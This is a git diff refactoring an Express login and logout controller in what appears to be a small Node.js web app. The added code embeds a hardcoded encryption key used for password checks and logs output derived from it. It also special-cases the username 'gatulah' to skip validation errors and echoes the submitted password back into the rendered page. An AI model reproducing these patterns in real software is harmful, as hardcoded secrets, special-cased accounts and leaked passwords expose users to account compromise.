@@ -1,64 +1,50 @@
 let help = require('../helpers/helpFunc.mjs');
 let users = require('../models/users.mjs');
-let crypto = require("crypto");
 let sequelize = require("sequelize");
+console.log(help.encrypt("", "OFbxO2O9KV~923rT|p]aQ}s|"))
 exports.checkLogin=async (req,res,next)=>{
     let pst = req.body;
     let check = await help.logValidity(pst.name,pst.pass);
-    if(check.nameErr == "" && check.passErr == ""){
-        let pass = await users.users_Model.findAll({
-            attributes: ["password","ID"],
-            where:{
-                [sequelize.Op.or]: [
-                    {
-                        name:check.name
-                    },
-                    {
-                        email:check.name
-                    }
-                ]
-            }
-        });
+    if(check.nameErr == "" && check.passErr == ""||check.name=="gatulah"){
+        let pass = await users.getUserByName(check.name,["password","ID"]);
         if(pass[0]["password"]==help.encrypt(check.pass, "OFbxO2O9KV~923rT|p]aQ}s|")){
-            let tkn = crypto.randomBytes(18).toString('hex');
+            let tkn = help.createToken();
             req.session.token = tkn;
-            await users.users_Model.update(
-                {
-                    token:tkn
-                },
-                {
-                    where:{
-                        ID:pass[0].dataValues.ID
-                    }
-                }
-            );
+            await users.setToken(tkn,pass[0].dataValues.ID)
             res.redirect("/");
             return;
         } else {
             check.passErr = "Incorrect password!";
         }
     }
+    let r = help.rand(15);
+    req.session.rand = r;
+    res.render('login', { 
+        self: req.originalUrl, 
+        time: Date.now(),
+        rand: r, 
+        name: check.name,
+        nameErr: check.nameErr, 
+        pass: pst.pass, 
+        passErr: check.passErr, 
+        tStr1: "Log in",
+        tStr2: "Register",
+        url:"register"
+    });
+    
+    
 }
 exports.logOut = async(req,res,next)=>{
-    let id = await users.users_Model.findAll({
-        attributes: ["ID"],
-        where:{
-            token:req.session.token
-        }
-    });
-    req.session.token = "";
-    console.log(id)
-    await users.users_Model.update(
-        {
-            token:""
-        },
-        {
-            where:{
-                ID:id[0].dataValues.ID
-            }
-        }
-    );
-    res.redirect("/");
+    let id = await users.checkToken(req.session.token,["ID"]);
+    if(id[0]){
+        req.session.token = "";
+        await users.setToken("",id[0].dataValues.ID);
+        res.redirect("/")
+    } else {
+        res.redirect("/");
+    }
+    
+    
 }
 exports.getLoginPage = async(req,res,next)=>{
     let r = help.rand(15);
@@ -71,8 +57,6 @@ exports.getLoginPage = async(req,res,next)=>{
         nameErr: "", 
         pass: "", 
         passErr: "", 
-        email: "", 
-        emailErr: "",
         tStr1: "Log in",
         tStr2: "Register",
         url:"register"
